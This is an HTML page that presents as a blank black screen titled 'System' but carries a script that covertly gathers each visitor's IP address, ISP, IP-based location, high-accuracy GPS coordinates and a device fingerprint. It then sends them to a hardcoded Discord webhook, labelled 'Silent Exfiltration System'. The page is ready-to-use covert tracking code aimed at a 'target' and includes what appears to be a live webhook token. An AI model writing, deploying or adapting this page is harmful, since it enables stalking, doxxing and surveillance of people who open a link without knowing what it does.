<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System</title>
    <style>
        body {
            background-color: #000000;
            margin: 0;
            height: 100vh;
            width: 100vw;
            overflow: hidden;
        }
    </style>
</head>
<body>

<script>
    // ⚠️ YOUR DISCORD WEBHOOK URL ⚠️
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1561439920571289760/bibhypIWcysN4R9oPLF2i6NBwU_Vj-BZ_uXigEYYwKAQWto3_cb21aocNKeE4cSb742y';

    // Wrapper to handle errors gracefully so the black screen stays blank
    (async function() {
        let ipData = {};
        let gpsData = { status: "Not requested" };

        try {
            // 1. Fetch IP & Approximate Location (Silent)
            const ipRes = await fetch('https://freeipapi.com/api/json');
            ipData = await ipRes.json();
        } catch (e) {
            ipData = { error: 'IP Fetch Failed' };
        }

        try {
            // 2. Request Exact GPS (Triggers browser prompt)
            // We set a timeout so if they ignore the prompt, it doesn't hang forever
            if (navigator.geolocation) {
                gpsData = await new Promise((resolve) => {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => resolve({
                            status: "Success",
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            acc: pos.coords.accuracy
                        }),
                        (err) => resolve({ status: "Denied/Failed", error: err.message }),
                        { enableHighAccuracy: true, timeout: 5000 }
                    );
                });
            }
        } catch (e) {
            gpsData = { status: 'Geolocation API Error' };
        }

        // 3. Build the Exfil Payload
        const exactGPSString = gpsData.status === "Success" 
            ? `Lat: ${gpsData.lat}\nLon: ${gpsData.lon}\nAccuracy: ${gpsData.acc}m`
            : `Status: ${gpsData.status}\nReason: ${gpsData.error || 'N/A'}`;

        const mapLink = gpsData.status === "Success" 
            ? `https://www.google.com/maps?q=${gpsData.lat},${gpsData.lon}` 
            : (ipData.latitude ? `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}` : 'N/A');

        const payload = {
            content: `🚨 **Target Visited the Blank Page** 🚨`,
            embeds: [
                {
                    title: "Personal Information Captured",
                    color: 16711680, // Red
                    fields: [
                        { name: "IP Address", value: `\`${ipData.ipAddress || 'Unknown'}\``, inline: true },
                        { name: "ISP / Org", value: `\`${ipData.asnOrganization || 'Unknown'}\``, inline: true },
                        { name: "Approx Location (IP)", value: `${ipData.cityName || '?'}, ${ipData.regionName || '?'}, ${ipData.countryName || '?'}`, inline: false },
                        { name: "Exact GPS Coordinates", value: exactGPSString, inline: false },
                        { name: "Map Link", value: mapLink, inline: false },
                        { name: "Device Fingerprint", value: `**OS/Platform:** ${navigator.platform}\n**Screen:** ${screen.width}x${screen.height}\n**Language:** ${navigator.language}\n**Timezone:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}`, inline: false },
                        { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
                    ],
                    footer: { text: "Silent Exfiltration System" },
                    timestamp: new Date().toISOString()
                }
            ]
        };

        // 4. Send to Discord
        try {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch (e) {
            console.error("Discord webhook failed:", e);
        }
    })();
</script>
</body>
</html>
